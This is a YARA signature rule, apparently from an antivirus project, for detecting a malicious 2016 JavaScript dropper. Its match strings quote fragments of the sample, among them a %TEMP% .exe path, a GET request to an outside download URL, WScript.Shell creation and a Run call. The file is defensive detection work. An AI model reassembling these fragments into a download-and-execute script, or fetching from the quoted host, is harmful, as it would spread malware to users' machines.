rule sig_20160328_7807c7627d26c1db60edde81aa8ea056 {
  meta:
    description = "datamaliciousorder - file 20160328_7807c7627d26c1db60edde81aa8ea056.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8527944e5e53e17bf18cb8f39e88b3d9956713f46a44060692d839a6a4eed77f"

  strings:
    $s1  = "function Kaaxkw() {return Pqpakazoh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"DN5J3joEU7h03Lz1.exe\";};" fullword ascii
    $s2  = "Waytglrt[Xdiokh](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Wudfbaf](Xarmw() * 11)} while (Waytglrt[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Pqpakazoh = function Tljqgmimv() {return WScript[Bosmvl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mbrsjzsb(Wlksjyic, Tkmoojl){return Wlksjyic - Tkmoojl;};" fullword ascii
    $s6  = "function Gviewj(Qgidq){Pqpakazoh[\"Run\"](Qgidq, Cjniwpcw, Cjniwpcw);};" fullword ascii
    $s7  = "function Kzgjcf() {return ((Bwtbhiyd == true) && (Bwtbhiyd == Dmvyulqfv)) ? 1 : Cjniwpcw;};" fullword ascii
    $s8  = " while (Mbthuqwmrp){" fullword ascii
    $s9  = "function Dfvalnaehd(Erzhtmjmuq) {var Gkwchdsv = (1, 2, 3, 4, 5, Erzhtmjmuq); return Gkwchdsv;};" fullword ascii
    $s10 = "Bwtbhiyd = true; " fullword ascii
    $s11 = "function Iadvaz(){return Bosmvl;};" fullword ascii
    $s12 = "Dmvyulqfv = true; " fullword ascii
    $s13 = "function Xarmw(){return 22;};" fullword ascii
    $s14 = "var Dmvyulqfv = false;" fullword ascii
    $s15 = "return Mbrsjzsb(Afdtsd, Ksjtup);" fullword ascii
    $s16 = "function Orcds()" fullword ascii
    $s17 = "var Ovfwwqqv = false;" fullword ascii
    $s18 = "function Ukgufqqpuy(){return Lqkxjxutw;};" fullword ascii
    $s19 = "var Szyfzgd = new this[\"Date\"]();" fullword ascii
    $s20 = "var Bwtbhiyd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}